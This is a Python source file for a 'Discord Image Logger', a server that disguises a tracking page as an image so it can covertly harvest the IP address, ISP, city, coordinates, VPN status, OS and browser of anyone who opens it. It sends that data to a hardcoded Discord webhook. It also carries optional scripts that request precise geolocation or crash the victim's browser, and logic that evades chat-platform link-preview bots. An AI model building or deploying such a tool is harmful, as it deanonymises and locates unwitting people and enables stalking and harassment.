# Discord Image Logger
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "timzz71"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1542691542807085098/tx_7D0GCqfYhVzqlgOs-67dCkqb46bOE3NINz7LtlLxKH0nZIIJrTT0xT9npO4hnKlWh",
    "image": "https://cdn.pfps.gg/pfps/3025-cool-spiderman.png",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Timz Image Logger.",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    if config["webhook"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not config["webhook"]:
        print("[!] No webhook URL set!")
        return

    if not ip or ip.startswith(blacklistedIPs):
        print(f"[!] IP blocked: {ip}")
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An Image Logging link was sent in a chat!\nYou may receive an IP soon.\n\nEndpoint: {endpoint}\nIP: {ip}\nPlatform: {bot}",
                    }
                ],
            })
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        print(f"[+] IP Info: {info}")
    except Exception as e:
        print(f"[!] Error getting IP info: {e}")
        return

    if info and info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info and info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"A User Opened the Original Image!\n\nEndpoint: {endpoint}\n\nIP Info:\nIP: {ip if ip else 'Unknown'}\nProvider: {info.get('isp', 'Unknown') if info else 'Unknown'}\nASN: {info.get('as', 'Unknown') if info else 'Unknown'}\nCountry: {info.get('country', 'Unknown') if info else 'Unknown'}\nRegion: {info.get('regionName', 'Unknown') if info else 'Unknown'}\nCity: {info.get('city', 'Unknown') if info else 'Unknown'}\nCoords: {info.get('lat', '') if info else ''}, {info.get('lon', '') if info else ''}\nTimezone: {info.get('timezone', 'Unknown') if info else 'Unknown'}\nMobile: {info.get('mobile', 'Unknown') if info else 'Unknown'}\nVPN: {info.get('proxy', 'Unknown') if info else 'Unknown'}\nBot: {info.get('hosting', 'Unknown') if info else 'Unknown'}\n\nPC Info:\nOS: {os}\nBrowser: {browser}\n\nUser Agent:\n{useragent}",
            }
        ],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        response = requests.post(config["webhook"], json=embed)
        print(f"[+] Webhook sent! Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error sending webhook: {e}")

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            forwarded_for = self.headers.get('x-forwarded-for', '')
            user_agent = self.headers.get('user-agent', '')

            print(f"[+] Request from IP: {forwarded_for}")
            print(f"[+] User-Agent: {user_agent}")

            # ALWAYS SEND WEBHOOK - THIS IS THE FIX
            if forwarded_for and forwarded_for != "127.0.0.1":
                makeReport(forwarded_for, user_agent, endpoint=self.path.split("?")[0], url=url)
            else:
                # Also send for localhost for testing
                makeReport(forwarded_for or "127.0.0.1", user_agent, endpoint=self.path.split("?")[0], url=url)

            if forwarded_for.startswith(blacklistedIPs):
                return

            if botCheck(forwarded_for, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_for, user_agent, location, s.split("?")[0], url=url)
                else:
                    result = makeReport(forwarded_for, user_agent, endpoint=s.split("?")[0], url=url)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_for or 'Unknown')
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", result.get("timezone", "Unknown"))
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown")))
                    message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1] if user_agent else "Unknown")
                    message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0] if user_agent else "Unknown")

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()

                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
                self.wfile.write(data)

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>Image Logger Server</h1><p>Visit <a href="/imagelogger">/imagelogger</a> to trigger the logger.</p>')
            return
        self.handleRequest()

    def do_POST(self):
        self.handleRequest()


def run_server():
    port = 8080
    server = HTTPServer(('', port), ImageLoggerAPI)
    print(f"[+] Server started on http://localhost:{port}")
    print(f"[+] Use ngrok to expose: ngrok http {port}")
    print(f"[+] Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Server stopped.")
        server.server_close()


if __name__ == "__main__":
    run_server()
